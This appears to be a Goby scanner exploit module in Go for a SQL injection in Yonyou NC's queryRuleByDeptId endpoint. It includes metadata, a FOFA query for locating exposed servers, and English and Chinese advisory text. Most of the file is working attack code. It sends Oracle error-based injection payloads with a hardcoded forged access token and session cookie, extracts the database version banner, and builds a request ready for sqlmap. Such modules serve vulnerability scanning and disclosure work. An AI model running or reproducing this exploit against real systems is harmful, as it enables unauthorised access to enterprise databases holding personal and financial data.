package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YonYou NC queryRuleByDeptId SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC is an abbreviation for Enterprise Resource Planning, which refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. Yonyou NC system is an information technology solution for integrated management of various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.</p>",
    "Product": "YONYOU-NC",
    "Homepage": "www.yonyou.com",
    "DisclosureDate": "2024-07-24",
    "PostTime": "2024-09-05",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "GobyQuery": "body=\"html/downloadBroswer.html\" && body=\"platform/pub/welcome.do\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a> </p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sqlpoint",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "用友NC queryRuleByDeptId SQL注入漏洞",
            "Product": "YONYOU-NC",
            "Description": "<p>用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平。<br></p>",
            "Recommendation": "<p>1、⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a>&nbsp;</p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "YonYou NC queryRuleByDeptId SQL Injection Vulnerability",
            "Product": "YONYOU-NC",
            "Description": "<p>Yonyou NC is an abbreviation for Enterprise Resource Planning, which refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. Yonyou NC system is an information technology solution for integrated management of various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a>&nbsp;</p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	setSqlPayloadKMwg7aBoIi := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		defineHeader := map[string]string{
			"Cookie":         "JSESSIONID=E0910A45BE78A1EE9290BA92341968E2.server",
			"accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ",
		}

		rawpayload := fmt.Sprintf("1' and (%s) is not null --", sql)
		urlget := "/ncchr/attendcalendar/queryRuleByDeptId?orgId=" + url.QueryEscape(rawpayload)

		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/ncchr/attendcalendar/queryRuleByDeptId"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qpqjq1qqqvq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (3209=3209) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadKMwg7aBoIi
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /ncchr/attendcalendar/queryRuleByDeptId?orgId=1 HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\naccessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=E0910A45BE78A1EE9290BA92341968E2.server\nUpgrade-Insecure-Requests: 1"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `"Oracle((\s|.)*?)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				// 全文有多个匹配结果，取第一个
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[0], nil
			}
			sendPayload := setSqlPayloadKMwg7aBoIi
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := `select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual`
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
